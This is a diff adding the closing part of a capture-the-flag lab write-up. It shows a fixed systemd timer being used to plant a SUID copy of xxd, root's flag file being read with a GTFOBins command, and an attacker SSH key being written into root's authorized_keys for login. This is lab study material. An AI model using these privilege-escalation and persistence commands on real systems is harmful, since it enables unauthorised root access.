@@ -378,9 +378,104 @@ THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}
 oh so now will return to this ``/etc/systemd/system/exploit.timer`` and ``/etc/systemd/system/exploit.service``
 
 
+![image](https://github.com/user-attachments/assets/c7fc67bb-ef75-4462-8404-58aa6d17051a)
+
+try to start ``exploit.timer``: 
+
+![image](https://github.com/user-attachments/assets/876553c6-c0e8-4b7e-98ae-831053c5f9c1)
 
 
+i search on ``gtfobins`` about ``xxd`` found :
 
+![image](https://github.com/user-attachments/assets/372df282-6aac-4a50-84f6-8985bc685008)
+
+but it still can't work because we don't have passowrd of comte
+
+if you look again to ``exploit.timer`` The value for **``OnBootSec``** is not set, which triggers the error.
+
+![image](https://github.com/user-attachments/assets/60b8772e-76ab-4eaf-9088-a5c0b78c5d56)
+
+We correct this by setting ``OnUnitActiveSec=0`` and ``OnBootSec=0``. This triggers the service immediately after execution.
+
+```
+[Unit]
+Description=Exploit Timer
+
+[Timer]
+OnUnitActiveSec=0
+OnBootSec=0
+
+[Install]
+WantedBy=timers.target
+```
+
+We run the service as follows, which copies the xxd to /opt and sets the SUID bit, recognisable by the red background.
+
+```
+sudo /bin/systemctl enable exploit.timer
+```
+
+```
+sudo /bin/systemctl restart exploit.timer
+```
+
+```
+cd /opt
+```
+
+
+![image](https://github.com/user-attachments/assets/0e885ef4-c947-46c7-9f19-1418c457d37e)
+
+now write exploit form ``gtfobins``
+
+```
+LFILE=/root/root.txt
+./xxd "$LFILE" | xxd -r
+```
+
+![image](https://github.com/user-attachments/assets/7faf0ac4-49a3-42ee-bfc7-2c1a87840e75)
+
+
+```
+      _                           _       _ _  __
+  ___| |__   ___  ___  ___  ___  (_)___  | (_)/ _| ___
+ / __| '_ \ / _ \/ _ \/ __|/ _ \ | / __| | | | |_ / _ \
+| (__| | | |  __/  __/\__ \  __/ | \__ \ | | |  _|  __/
+ \___|_| |_|\___|\___||___/\___| |_|___/ |_|_|_|  \___|
+
+
+THM{dca75486094810807faf4b7b0a929b11e5e0167c}
+```
+
+
+Boom last flag !!! 
+
+``but wait still not root ``
+
+First, we generate a simple password using ssh-keygen using the following command:
+
+```
+ssh-keygen -t rsa
+```
+
+```
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOryhrHn09cLM3viJUjAfbWLtjlP6B850w1RP617G5K+hZbpjJZq82BcDo+Jp+m62tE/4x6qfy9FwOmwPqlt6+uJjsIvqR7jwTQx5rrA06IQ0xS1D1EqvPrZ6EXWHF6q1uZO+Z4N4wsx84WzES1XyLmlOcOnGJCsQFkVvECUhkBqm04BFUomsJzssKr2+lvc0HwvgbeyWKXnzqRz1597NIDFhVzYVJqRKDem20xer2UeusXRKpvY8BmbWYncZpGXGvWF4Ivx1CcJ4Gld4VIFEr2TekdW91M7dBTTVrPxtQKdqFGO2TXDe/MjAF+GLx3vP287b1S57F+pWBPxYn1t+F5CmuWo1afOC3AINSeUc0VuD1JBymAIf2PVO2M1sPYApAXIkBTOmQaAVOHgzu3giIoI+1TvVQHSns124NvRCujUpE+lBKPMy1MqvW88LSLWoeIRx/Np9iN6cGWiDJKhdkxSs/rrVyKWrtdev4SBpVNFiZuYbkto9d9fRKNo32tFs= kali@kali
+```
+
+![image](https://github.com/user-attachments/assets/1dbd3f31-f8d6-4995-8514-4cd38ef52407)
+
+
+We can leverage this to add an SSH key for the root user.
+
+```
+echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOryhrHn09cLM3viJUjAfbWLtjlP6B850w1RP617G5K+hZbpjJZq82BcDo+Jp+m62tE/4x6qfy9FwOmwPqlt6+uJjsIvqR7jwTQx5rrA06IQ0xS1D1EqvPrZ6EXWHF6q1uZO+Z4N4wsx84WzES1XyLmlOcOnGJCsQFkVvECUhkBqm04BFUomsJzssKr2+lvc0HwvgbeyWKXnzqRz1597NIDFhVzYVJqRKDem20xer2UeusXRKpvY8BmbWYncZpGXGvWF4Ivx1CcJ4Gld4VIFEr2TekdW91M7dBTTVrPxtQKdqFGO2TXDe/MjAF+GLx3vP287b1S57F+pWBPxYn1t+F5CmuWo1afOC3AINSeUc0VuD1JBymAIf2PVO2M1sPYApAXIkBTOmQaAVOHgzu3giIoI+1TvVQHSns124NvRCujUpE+lBKPMy1MqvW88LSLWoeIRx/Np9iN6cGWiDJKhdkxSs/rrVyKWrtdev4SBpVNFiZuYbkto9d9fRKNo32tFs= kali@kali' | xxd | /opt/xxd -r - /root/.ssh/authorized_keys
+```
+
+```
+ssh -i id_rsa root@10.10.180.156
+```
+
+![image](https://github.com/user-attachments/assets/8cae4516-f4cf-4aaa-97f2-16b02072ffae)
 
 
 
